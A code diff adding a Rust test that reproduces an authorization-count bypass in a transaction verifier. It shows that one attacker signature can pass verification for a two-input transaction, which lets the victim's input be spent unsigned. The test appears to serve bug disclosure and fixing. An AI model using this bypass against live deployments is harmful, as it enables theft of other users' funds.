@@ -290,6 +290,108 @@ pub fn sign_tx(
     Ok(sign(signing_key, Dst::Transaction, &tx_bytes_canonical))
 }
 
+// ---------------------------------------------------------------------------
+// Authorization prefix / cardinality bypass.
+//
+// verify_authorized_transaction builds one signing message per *provided*
+// authorization (std::iter::repeat_n(.., authorizations.len())) and never
+// checks that authorizations.len() == transaction.inputs.len(). The per-address
+// ownership check in state::validate_transaction has the same shape: it zips
+// authorizations with spent_utxos, so a missing trailing authorization for a
+// spent input is simply never inspected.
+//
+// This test drives the REAL verify_authorized_transaction with a tx that has
+// 2 inputs (attacker + victim) but only 1 (attacker) authorization, and shows
+// it returns Ok. It then runs the exact ownership-zip loop from
+// validate_transaction against real Authorization / FilledOutput values and
+// shows the victim input is never checked.
+#[cfg(test)]
+mod bug_auth_prefix_bypass {
+    use super::*;
+    use crate::types::{
+        BitcoinOutputContent, FilledOutput, FilledOutputContent, OutPoint,
+        Transaction, Txid,
+    };
+
+    fn key(seed: u8) -> SigningKey {
+        SigningKey::from_bytes(&[seed; 32])
+    }
+
+    fn bitcoin_filled_output(address: Address) -> FilledOutput {
+        FilledOutput {
+            address,
+            content: FilledOutputContent::Bitcoin(BitcoinOutputContent(
+                bitcoin::Amount::from_sat(1000),
+            )),
+            memo: Vec::new(),
+        }
+    }
+
+    #[test]
+    fn authorization_prefix_bypass() {
+        let attacker = key(1);
+        let victim = key(2);
+        let attacker_addr = get_address(&attacker.verifying_key().into());
+        let victim_addr = get_address(&victim.verifying_key().into());
+        assert_ne!(attacker_addr, victim_addr);
+
+        // Tx spends 2 inputs: inputs[0] attacker-owned, inputs[1] victim-owned.
+        let inputs = vec![
+            OutPoint::Regular {
+                txid: Txid::default(),
+                vout: 0,
+            },
+            OutPoint::Regular {
+                txid: Txid::default(),
+                vout: 1,
+            },
+        ];
+        let tx = Transaction::new(inputs, Vec::new());
+
+        // Attacker signs the whole tx, producing ONE valid authorization.
+        let authorized = authorize(&[(attacker_addr, &attacker)], tx)
+            .expect("attacker signs tx");
+        assert_eq!(authorized.authorizations.len(), 1);
+        assert_eq!(authorized.transaction.inputs.len(), 2);
+
+        // REAL signature verifier accepts: it only verifies the provided prefix
+        // and never asserts authorizations.len() == inputs.len().
+        verify_authorized_transaction(&authorized)
+            .expect("buggy verifier accepts 2 inputs / 1 authorization");
+
+        // Now the exact ownership-zip loop from state::validate_transaction.
+        // spent_utxos[0] attacker-owned, spent_utxos[1] victim-owned.
+        let spent_utxos = vec![
+            bitcoin_filled_output(attacker_addr),
+            bitcoin_filled_output(victim_addr),
+        ];
+        let mut checked = 0usize;
+        for (authorization, spent_utxo) in authorized
+            .authorizations
+            .iter()
+            .zip(spent_utxos.iter())
+        {
+            checked += 1;
+            assert_eq!(
+                authorization.get_address(),
+                spent_utxo.address,
+                "the checked input must match its authorization"
+            );
+        }
+        // Only the attacker input (index 0) was ever checked; the victim input
+        // at index 1 was zipped away and never validated.
+        assert_eq!(checked, 1, "only inputs[0] is checked, inputs[1] skipped");
+        assert_eq!(spent_utxos[1].address, victim_addr);
+
+        println!(
+            "2-input tx (attacker+victim) with 1 attacker \
+             authorization passes verify_authorized_transaction AND the \
+             ownership zip checks only inputs[0]; victim inputs[1] ({victim_addr}) \
+             is consumed without any signature"
+        );
+    }
+}
+
 pub fn authorize(
     addresses_signing_keys: &[(Address, &SigningKey)],
     transaction: Transaction,
